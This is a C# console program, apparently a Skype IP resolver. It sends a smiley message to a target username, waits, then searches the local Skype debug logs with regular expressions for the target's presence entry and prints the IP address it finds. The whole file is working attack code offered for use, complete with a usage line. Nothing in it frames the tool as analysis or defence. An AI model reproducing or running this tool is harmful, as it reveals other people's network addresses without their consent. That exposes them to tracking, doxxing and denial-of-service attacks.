using System;
using System.Threading;
using System.IO;
using System.Text.RegularExpressions;
using SKYPE4COMLib;

class Program
{
    public static bool found = false; // to stop other threads if we found it

    static void Main(string[] args)
    {
        /* declare here so we don't encounter any errors */
        string username = null;
        string dirpath = null;
        string waittime = null;

        try
        {
            username = args[0];
            waittime = args[1];
        }
        catch
        {
            Console.WriteLine("Syntax: <skype username> <wait (ms)> [<directory>]"); // can't do anything if no username is in the args, so quit.
            Environment.Exit(0);
        }

        // If the directory path is not set in the arguments then let's use the current directory
        try { dirpath = args[2]; }
        catch { dirpath = Directory.GetCurrentDirectory(); }

        try
        {
            Skype skype = new Skype(); // Set up
            skype.SendMessage(args[0], ":-)");
        }
        catch
        {
            Console.WriteLine("Must run on an x86.");
            Environment.Exit(0);
        }

        Thread.Sleep(Convert.ToInt16(waittime)); // We have to wait for the log file to update

        // Here we go.
        start_threads(username, dirpath);
    }

    static void start_threads(string username, string dirpath)
    {
        string[] files = Directory.GetFiles(dirpath, "Debug*.log"); // Get all debug files

        if (files.Length == 0)
        {
            Console.WriteLine("No debug logs."); // if you don't have debug files then quit
            Environment.Exit(0);
        }

        foreach (string file in files)
        {
            ThreadStart threadstart = delegate { threadDoWork(username, file); };
            new Thread(threadstart).Start(); // foreach file start a new thread, faster but more costly
        }
    }

    static void threadDoWork(string username, string filepath)
    {
        try
        {
            /* Below is setting the streamreader, and telling the stream to 
              read it in READ-ONLY so it can read files that are already in use*/
            Stream log = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            StreamReader streamReader = new StreamReader(log);

            string line;
            while ((line = streamReader.ReadLine()) != null && found == false)
                if (line.Contains(username)) // see if line contains username
                    if (Regex.Match(line, "PresenceManager: (.*?)" + username + "(.*?)-r.(.*?)").Success) // checks to see if it's the correct line
                    {
                        found = true;
                        Console.WriteLine(new Regex(username + ".*-r(.*?):").Match(line).Groups[1].ToString()); // Finally outputs IP if found otherwise, nothing is returned
                    }
        }
        catch { }
    }
}